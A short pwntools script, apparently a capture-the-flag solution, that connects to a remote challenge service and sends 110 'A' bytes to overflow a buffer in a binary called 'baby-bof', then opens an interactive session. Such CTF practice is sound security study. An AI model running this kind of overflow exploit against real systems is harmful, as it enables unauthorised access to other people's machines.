from pwn import *

e = ELF("./baby-bof")
context.binary = e

r = remote("35.240.148.138",5001)
#r = process([e.path])

r.sendline(b'A'*110)
r.interactive()